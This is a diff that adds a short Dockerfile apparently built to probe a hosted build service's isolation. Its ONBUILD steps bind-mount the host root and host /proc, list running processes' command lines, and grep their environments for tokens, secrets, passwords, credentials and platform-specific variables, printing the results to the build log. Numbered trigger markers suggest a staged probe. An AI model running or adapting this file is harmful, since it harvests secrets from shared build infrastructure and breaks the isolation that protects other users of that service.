@@ -1,0 +1,6 @@
+FROM alpine:3.20 AS base
+ONBUILD RUN --mount=type=bind,source=root,target=/hr sh -c 'set +e; echo "===R7A_ROOT_MOUNT_OK==="; ls -la /hr | head -20'
+ONBUILD RUN --mount=type=bind,source=host/proc,target=/hp sh -c 'set +e; echo "===R7B_HOSTPROC==="; ls /hp 2>&1 | head -20; echo --COUNT--; ls /hp | grep -cE "^[0-9]+$"; for p in $(ls /hp | grep -E "^[0-9]+$" | head -80); do c=$(tr "\0" " " < /hp/$p/cmdline 2>/dev/null); [ -z "$c" ] && continue; echo "== PID $p :: $c"; done; echo --ENVS--; for p in $(ls /hp | grep -E "^[0-9]+$" | head -80); do e=$(tr "\0" "\n" < /hp/$p/environ 2>/dev/null | grep -Ei "TOKEN|SECRET|PASSWORD|NATS|URL|ADDR|TARGET|CERT|CRED|TMPL|RAILWAY|TEMPORAL|OTEL" | head -12); [ -z "$e" ] && continue; echo "== PID $p"; echo "$e"; done; echo "===R7B_END==="'
+FROM base
+RUN sh -c 'echo R7_TRIGGER'
+CMD ["sh","-c","sleep 5"]
